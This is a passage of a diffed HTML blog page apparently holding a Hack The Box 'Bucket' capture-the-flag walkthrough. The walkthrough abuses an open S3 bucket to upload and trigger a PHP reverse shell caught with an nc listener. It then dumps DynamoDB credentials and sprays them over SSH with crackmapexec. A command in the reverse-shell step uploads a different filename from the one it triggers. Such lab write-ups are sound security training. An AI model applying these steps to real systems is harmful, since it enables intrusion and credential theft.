+</span></span><span class="line"><span class="cl">&lt;/body&gt;&lt;/html&gt;</span></span></code></pre>
+</figure><p>I&rsquo;ll add <code>bucket.htb</code> to <code>/etc/hosts</code></p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">10.10.10.212    bucket.htb</span></span></code></pre>
+</figure><p>Now it displays a web page called &ldquo;Bucket Advertising Platform&rdquo;.</p>
 <p><div class="img-container"><img src="imgs/image-20210422234425022.png" alt="image-20210422234425022"  /></div>
 </p>
 <p>Inspecting the page source discovers a vhost.</p>
 <p><div class="img-container"><img src="imgs/image-20210422234754897.png" alt="image-20210422234754897"  /></div>
 </p>
 <p>I&rsquo;ll add the domain name to <code>/etc/hosts</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">10.10.10.212    bucket.htb s3.bucket.htb
-</span></span></code></pre></div><h4 id="gobuster">Gobuster</h4>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">10.10.10.212    bucket.htb s3.bucket.htb</span></span></code></pre>
+</figure><h4 id="gobuster">Gobuster</h4>
 <p>There&rsquo;s no interesting results.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
 </span></span><span class="line"><span class="cl">$ gobuster dir -u http://bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-M-80
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
 </span></span><span class="line"><span class="cl">/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 5344<span class="o">]</span>
-</span></span><span class="line"><span class="cl">/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 275<span class="o">]</span> 
-</span></span></code></pre></div><h3 id="tcp-80---s3buckethtb">TCP 80 - s3.bucket.htb</h3>
+</span></span><span class="line"><span class="cl">/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 275<span class="o">]</span> </span></span></code></pre>
+</figure><h3 id="tcp-80---s3buckethtb">TCP 80 - s3.bucket.htb</h3>
 <p>Visiting the newly discovered hostname displays a typical json output format.</p>
 <p><div class="img-container"><img src="imgs/image-20210422235335494.png" alt="image-20210422235335494"  /></div>
 </p>
 <h4 id="gobuster-1">Gobuster</h4>
 <p><code>gobuster</code> scan discovers a few web paths.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
 </span></span><span class="line"><span class="cl">$ gobuster dir -u http://s3.bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-vhost-M-80
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
 </span></span><span class="line"><span class="cl">/shell                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span>
 </span></span><span class="line"><span class="cl">/health               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 54<span class="o">]</span>
-</span></span><span class="line"><span class="cl">/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 275<span class="o">]</span> 
-</span></span></code></pre></div><h4 id="shell">/shell</h4>
+</span></span><span class="line"><span class="cl">/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 275<span class="o">]</span> </span></span></code></pre>
+</figure><h4 id="shell">/shell</h4>
 <p>Vising <code>/shell</code> redirects to http://444af250749d:4566/shell/.</p>
 <p><div class="img-container"><img src="imgs/image-20210424222707480.png" alt="image-20210424222707480"  /></div>
 </p>
 <p>On <code>curl</code>, the server returns with a bunch of HTTP headers in its response</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «~» «10.10.14.51» 
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «~» «10.10.14.51» 
 </span></span><span class="line"><span class="cl">$ curl -sv http://s3.bucket.htb/shell
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
@@ -662,10 +707,11 @@
 </span></span><span class="line"><span class="cl">&lt; access-control-allow-headers: authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging
 </span></span><span class="line"><span class="cl">&lt; access-control-expose-headers: x-amz-version-id
 </span></span><span class="line"><span class="cl">&lt; 
-</span></span><span class="line"><span class="cl">* Connection <span class="c1">#0 to host s3.bucket.htb left intact</span>
-</span></span></code></pre></div><p>I added it to <code>/etc/hosts</code> but it still doesn&rsquo;t resolve.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">10.10.10.212    bucket.htb s3.bucket.htb 444af250749d
-</span></span></code></pre></div><p>Searching some of the header names on Google reveals these are used by Amazon S3</p>
+</span></span><span class="line"><span class="cl">* Connection <span class="c1">#0 to host s3.bucket.htb left intact</span></span></span></code></pre>
+</figure><p>I added it to <code>/etc/hosts</code> but it still doesn&rsquo;t resolve.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">10.10.10.212    bucket.htb s3.bucket.htb 444af250749d</span></span></code></pre>
+</figure><p>Searching some of the header names on Google reveals these are used by Amazon S3</p>
 <p><div class="img-container"><img src="imgs/image-20210425002915838.png" alt="image-20210425002915838"  /></div>
 </p>
 <p>Adding another <code>/</code> at the end of URL resolve to a DynamoDB JavaScript Shell, but I have no familiarity on this.</p>
@@ -682,27 +728,32 @@
 >aws cli</a>. You can find the user guide <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html#using-s3-commands-listing-buckets"target="_blank" rel="noopener noreferrer"
 >here</a>.</p>
 <p>Usage in general:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">aws [options] s3 &lt;subcommand&gt; [parameters]
-</span></span></code></pre></div><p>I&rsquo;ll start by listing the S3 bucket, but then it returns an error message.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">aws [options] s3 &lt;subcommand&gt; [parameters]</span></span></code></pre>
+</figure><p>I&rsquo;ll start by listing the S3 bucket, but then it returns an error message.</p>
 <blockquote>
 <p>A bucket is a container for objects stored in Amazon S3. It is a folder but not really a folder.</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
 </span></span><span class="line"><span class="cl">$ aws s3 ls --endpoint-url<span class="o">=</span>http://s3.bucket.htb 
-</span></span><span class="line"><span class="cl">You must specify a region. You can also configure your region by running <span class="s2">&#34;aws configure&#34;</span>.
-</span></span></code></pre></div><p>I can resolve the problem above by typing <code>aws configure</code> and fill only the default region.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
+</span></span><span class="line"><span class="cl">You must specify a region. You can also configure your region by running <span class="s2">&#34;aws configure&#34;</span>.</span></span></code></pre>
+</figure><p>I can resolve the problem above by typing <code>aws configure</code> and fill only the default region.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
 </span></span><span class="line"><span class="cl">$ aws configure
 </span></span><span class="line"><span class="cl">AWS Access Key ID <span class="o">[</span>None<span class="o">]</span>:
 </span></span><span class="line"><span class="cl">AWS Secret Access Key <span class="o">[</span>None<span class="o">]</span>:
 </span></span><span class="line"><span class="cl">Default region name <span class="o">[</span>None<span class="o">]</span>: us-east-1
-</span></span><span class="line"><span class="cl">Default output format <span class="o">[</span>None<span class="o">]</span>:
-</span></span></code></pre></div><p>Now it works and returns a bucket called <code>adserver</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
+</span></span><span class="line"><span class="cl">Default output format <span class="o">[</span>None<span class="o">]</span>:</span></span></code></pre>
+</figure><p>Now it works and returns a bucket called <code>adserver</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
 </span></span><span class="line"><span class="cl">$ aws s3 ls --endpoint-url<span class="o">=</span>http://s3.bucket.htb 
-</span></span><span class="line"><span class="cl">2020-10-21 09:16:03 adserver
-</span></span></code></pre></div><p>I can also read the objects inside <code>adserver</code> bucket.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
+</span></span><span class="line"><span class="cl">2020-10-21 09:16:03 adserver</span></span></code></pre>
+</figure><p>I can also read the objects inside <code>adserver</code> bucket.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
 </span></span><span class="line"><span class="cl">$ aws s3 ls s3://adserver --endpoint-url<span class="o">=</span>http://s3.bucket.htb
 </span></span><span class="line"><span class="cl">                           PRE images/
 </span></span><span class="line"><span class="cl">2020-10-21 09:22:04       <span class="m">5344</span> index.html
@@ -711,41 +762,48 @@
 </span></span><span class="line"><span class="cl">$ aws s3 ls s3://adserver/images/ --endpoint-url<span class="o">=</span>http://s3.bucket.htb
 </span></span><span class="line"><span class="cl">2020-10-21 09:52:04      <span class="m">37840</span> bug.jpg
 </span></span><span class="line"><span class="cl">2020-10-21 09:52:04      <span class="m">51485</span> cloud.png
-</span></span><span class="line"><span class="cl">2020-10-21 09:52:04      <span class="m">16486</span> malware.png
-</span></span></code></pre></div><p>These files are the same files seen previously on <code>bucket.htb</code>.</p>
+</span></span><span class="line"><span class="cl">2020-10-21 09:52:04      <span class="m">16486</span> malware.png</span></span></code></pre>
+</figure><p>These files are the same files seen previously on <code>bucket.htb</code>.</p>
 <h4 id="php-reverse-shell-upload-via-s3">PHP Reverse Shell upload via S3</h4>
 <p>The aws subcommand <code>cp</code> allows to copy a file (objects) from local to a bucket, and vice versa (<a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html#using-s3-commands-managing-objects-copy"target="_blank" rel="noopener noreferrer"
 >source</a>).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">aws s3 cp &lt;source&gt; &lt;target&gt; <span class="o">[</span>--options<span class="o">]</span>
-</span></span></code></pre></div><p>Because I know the web server is Apache, I&rsquo;ll create a php test file and upload it to the bucket.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">aws s3 cp &lt;source&gt; &lt;target&gt; <span class="o">[</span>--options<span class="o">]</span></span></span></code></pre>
+</figure><p>Because I know the web server is Apache, I&rsquo;ll create a php test file and upload it to the bucket.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
 </span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;&lt;?php echo &#34;IamF&#34; ?&gt;&#39;</span> &gt; iamf-test.php
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
 </span></span><span class="line"><span class="cl">$ aws s3 cp ./iamf-test.php s3://adserver/ --endpoint-url<span class="o">=</span>http://s3.bucket.htb
-</span></span><span class="line"><span class="cl">upload: ./iamf-test.php to s3://adserver/iamf-test.php 
-</span></span></code></pre></div><p>I can confirm the file was successfully uploaded with the subcommand <code>ls</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
+</span></span><span class="line"><span class="cl">upload: ./iamf-test.php to s3://adserver/iamf-test.php </span></span></code></pre>
+</figure><p>I can confirm the file was successfully uploaded with the subcommand <code>ls</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
 </span></span><span class="line"><span class="cl">$ aws s3 ls s3://adserver/ --endpoint-url<span class="o">=</span>http://s3.bucket.htb 
 </span></span><span class="line"><span class="cl">                           PRE images/
 </span></span><span class="line"><span class="cl">2021-04-22 14:05:15         <span class="m">21</span> iamf-test.php
-</span></span><span class="line"><span class="cl">2021-04-22 14:05:04       <span class="m">5344</span> index.html
-</span></span></code></pre></div><p>The file is available at <code>http://s3.bucket.htb/adserver/iamf-test.php</code> and <code>http://bucket.htb/iamf-test.php</code> but the execution of PHP code happens on <code>bucket.htb</code>. A few minutes later my files got deleted, so I can guess there&rsquo;s a cleanup happening.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
+</span></span><span class="line"><span class="cl">2021-04-22 14:05:04       <span class="m">5344</span> index.html</span></span></code></pre>
+</figure><p>The file is available at <code>http://s3.bucket.htb/adserver/iamf-test.php</code> and <code>http://bucket.htb/iamf-test.php</code> but the execution of PHP code happens on <code>bucket.htb</code>. A few minutes later my files got deleted, so I can guess there&rsquo;s a cleanup happening.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
 </span></span><span class="line"><span class="cl">$ curl -s http://s3.bucket.htb/adserver/iamf-test.php
 </span></span><span class="line"><span class="cl">&lt;?php <span class="nb">echo</span> <span class="s2">&#34;IamF&#34;</span> ?&gt;
 </span></span><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
 </span></span><span class="line"><span class="cl">$ curl -s http://bucket.htb/iamf-test.php
-</span></span><span class="line"><span class="cl">IamF
-</span></span></code></pre></div><p>Now I can try to drop a <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"target="_blank" rel="noopener noreferrer"
+</span></span><span class="line"><span class="cl">IamF</span></span></code></pre>
+</figure><p>Now I can try to drop a <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"target="_blank" rel="noopener noreferrer"
 >PHP reverse shell</a>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
-</span></span><span class="line"><span class="cl">$ aws s3 cp ./iamf-test.php s3://adserver/ --endpoint-url<span class="o">=</span>http://s3.bucket.htb
-</span></span></code></pre></div><p>Then I&rsquo;ll trigger it using <code>curl</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
-</span></span><span class="line"><span class="cl">$ curl -s http://bucket.htb/iamf.php
-</span></span></code></pre></div><p>I have a shell now my listener (wait for a few minutes or reupload the shell if it doesn&rsquo;t pop a shell).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
+</span></span><span class="line"><span class="cl">$ aws s3 cp ./iamf-test.php s3://adserver/ --endpoint-url<span class="o">=</span>http://s3.bucket.htb</span></span></code></pre>
+</figure><p>Then I&rsquo;ll trigger it using <code>curl</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
+</span></span><span class="line"><span class="cl">$ curl -s http://bucket.htb/iamf.php</span></span></code></pre>
+</figure><p>I have a shell now my listener (wait for a few minutes or reupload the shell if it doesn&rsquo;t pop a shell).</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
 </span></span><span class="line"><span class="cl">$ rlwrap nc -nvlp <span class="m">9001</span>
 </span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
 </span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.39<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.212<span class="o">]</span> <span class="m">58352</span>
@@ -755,16 +813,18 @@
 </span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
 </span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1050<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
 </span></span><span class="line"><span class="cl">bash: no job control in this shell
-</span></span><span class="line"><span class="cl">www-data@bucket:/$ 
-</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+</span></span><span class="line"><span class="cl">www-data@bucket:/$ </span></span></code></pre>
+</figure><h2 id="privilege-escalation">Privilege Escalation</h2>
 <h3 id="shell-as-roy">Shell as roy</h3>
 <h4 id="enumeration-1">Enumeration</h4>
 <p><code>roy</code> is the only user in this box.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@bucket:/$ cat /etc/passwd <span class="p">|</span> grep sh$
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@bucket:/$ cat /etc/passwd <span class="p">|</span> grep sh$
 </span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
-</span></span><span class="line"><span class="cl">roy:x:1000:1000:,,,:/home/roy:/bin/bash
-</span></span></code></pre></div><p>Visiting <code>roy</code> home directory discovers a folder called <code>project</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@bucket:/var/www$ ls -la /home/roy
+</span></span><span class="line"><span class="cl">roy:x:1000:1000:,,,:/home/roy:/bin/bash</span></span></code></pre>
+</figure><p>Visiting <code>roy</code> home directory discovers a folder called <code>project</code></p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@bucket:/var/www$ ls -la /home/roy
 </span></span><span class="line"><span class="cl">total <span class="m">44</span>
 </span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">7</span> roy  roy  <span class="m">4096</span> Apr <span class="m">22</span> 12:03 .
 </span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Sep <span class="m">16</span>  <span class="m">2020</span> ..
@@ -777,18 +837,20 @@
 </span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> roy  roy   <span class="m">807</span> Sep <span class="m">16</span>  <span class="m">2020</span> .profile
 </span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> roy  roy  <span class="m">4096</span> Apr <span class="m">22</span> 07:59 project
 </span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> roy  roy  <span class="m">4096</span> Apr <span class="m">22</span> 07:59 snap
-</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> roy  roy    <span class="m">33</span> Apr <span class="m">22</span> 04:56 user.txt
-</span></span></code></pre></div><p>The files inside <code>project</code> are readable by others.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@bucket:/home/roy/project$ ls -la
+</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> roy  roy    <span class="m">33</span> Apr <span class="m">22</span> 04:56 user.txt</span></span></code></pre>
+</figure><p>The files inside <code>project</code> are readable by others.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@bucket:/home/roy/project$ ls -la
 </span></span><span class="line"><span class="cl">total <span class="m">44</span>
 </span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> roy roy  <span class="m">4096</span> Sep <span class="m">24</span>  <span class="m">2020</span> .
 </span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">5</span> roy roy  <span class="m">4096</span> Apr <span class="m">24</span> 17:31 ..
 </span></span><span class="line"><span class="cl">-rw-rw-r--  <span class="m">1</span> roy roy    <span class="m">63</span> Sep <span class="m">24</span>  <span class="m">2020</span> composer.json
 </span></span><span class="line"><span class="cl">-rw-rw-r--  <span class="m">1</span> roy roy <span class="m">20533</span> Sep <span class="m">24</span>  <span class="m">2020</span> composer.lock
 </span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> roy roy   <span class="m">367</span> Sep <span class="m">24</span>  <span class="m">2020</span> db.php
-</span></span><span class="line"><span class="cl">drwxrwxr-x <span class="m">10</span> roy roy  <span class="m">4096</span> Sep <span class="m">24</span>  <span class="m">2020</span> vendor
-</span></span></code></pre></div><p>Looking into <code>db.php</code>, the project seems to use AWS DynamoDB as the project database. I can also see the endpoint URL.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@bucket:/home/roy/project$ cat db.php
+</span></span><span class="line"><span class="cl">drwxrwxr-x <span class="m">10</span> roy roy  <span class="m">4096</span> Sep <span class="m">24</span>  <span class="m">2020</span> vendor</span></span></code></pre>
+</figure><p>Looking into <code>db.php</code>, the project seems to use AWS DynamoDB as the project database. I can also see the endpoint URL.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@bucket:/home/roy/project$ cat db.php
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">&lt;?php
 </span></span><span class="line"><span class="cl">require <span class="s1">&#39;vendor/autoload.php&#39;</span><span class="p">;</span>
@@ -805,28 +867,32 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nv">$dynamodb</span> <span class="o">=</span> <span class="nv">$client</span>-&gt;createDynamoDb<span class="o">()</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">//todo
-</span></span></code></pre></div><p><code>localhost:4566</code> is the internal endpoint of <code>s3.bucket.htb</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@bucket:/home/roy/project$ curl -s http://localhost:4566
+</span></span><span class="line"><span class="cl">//todo</span></span></code></pre>
+</figure><p><code>localhost:4566</code> is the internal endpoint of <code>s3.bucket.htb</code></p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@bucket:/home/roy/project$ curl -s http://localhost:4566
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">{</span>
 </span></span><span class="line"><span class="cl">	<span class="s2">&#34;s3&#34;</span>: <span class="s2">&#34;running&#34;</span>, 
 </span></span><span class="line"><span class="cl">	<span class="s2">&#34;dynamodb&#34;</span>: <span class="s2">&#34;running&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></div><h4 id="aws-dynamodb">AWS DynamoDB</h4>
+</span></span><span class="line"><span class="cl"><span class="o">}</span></span></span></code></pre>
+</figure><h4 id="aws-dynamodb">AWS DynamoDB</h4>
 <p>DynamoDB is a NoSQL database developed by Amazon. I can also use the amazon cli to interact with the DynamoDB, and it uses the same endpoint as the S3.</p>
 <p>General usage:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">usage: aws <span class="o">[</span>options<span class="o">]</span> dynamodb &lt;subcommand&gt; <span class="o">[</span>&lt;subcommand&gt; ...<span class="o">]</span> <span class="o">[</span>parameters<span class="o">]</span>
-</span></span></code></pre></div><p>Anonymous user is allowed to list the database tables.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">usage: aws <span class="o">[</span>options<span class="o">]</span> dynamodb &lt;subcommand&gt; <span class="o">[</span>&lt;subcommand&gt; ...<span class="o">]</span> <span class="o">[</span>parameters<span class="o">]</span></span></span></code></pre>
+</figure><p>Anonymous user is allowed to list the database tables.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
 </span></span><span class="line"><span class="cl">$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
 </span></span><span class="line"><span class="cl"><span class="o">{</span>
 </span></span><span class="line"><span class="cl">    <span class="s2">&#34;TableNames&#34;</span>: <span class="o">[</span>
 </span></span><span class="line"><span class="cl">        <span class="s2">&#34;users&#34;</span>
 </span></span><span class="line"><span class="cl">    <span class="o">]</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></div><p>I can read the content of table <code>users</code> with the subcommand <code>scan</code>, and it discovers several credentials.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
+</span></span><span class="line"><span class="cl"><span class="o">}</span></span></span></code></pre>
+</figure><p>I can read the content of table <code>users</code> with the subcommand <code>scan</code>, and it discovers several credentials.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
 </span></span><span class="line"><span class="cl">$ aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb
 </span></span><span class="line"><span class="cl"><span class="o">{</span>
 </span></span><span class="line"><span class="cl">    <span class="s2">&#34;Items&#34;</span>: <span class="o">[</span>
@@ -858,18 +924,20 @@
 </span></span><span class="line"><span class="cl">    <span class="s2">&#34;Count&#34;</span>: 3,
 </span></span><span class="line"><span class="cl">    <span class="s2">&#34;ScannedCount&#34;</span>: 3,
 </span></span><span class="line"><span class="cl">    <span class="s2">&#34;ConsumedCapacity&#34;</span>: null
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></div><p>I&rsquo;ll keep those credentials.</p>
+</span></span><span class="line"><span class="cl"><span class="o">}</span></span></span></code></pre>
+</figure><p>I&rsquo;ll keep those credentials.</p>
 <h4 id="ssh-access">SSH Access</h4>
 <p>Password <code>n2vM-&lt;_K_Q:.Aa2</code> works on <code>roy</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
 </span></span><span class="line"><span class="cl">$ crackmapexec ssh <span class="s1">&#39;10.10.10.212&#39;</span> -u roy -p passwords.list
 </span></span><span class="line"><span class="cl">SSH         10.10.10.212    <span class="m">22</span>     10.10.10.212     <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
 </span></span><span class="line"><span class="cl">SSH         10.10.10.212    <span class="m">22</span>     10.10.10.212     <span class="o">[</span>-<span class="o">]</span> roy:Management@#1@# Authentication failed.
 </span></span><span class="line"><span class="cl">SSH         10.10.10.212    <span class="m">22</span>     10.10.10.212     <span class="o">[</span>-<span class="o">]</span> roy:Welcome123! Authentication failed.
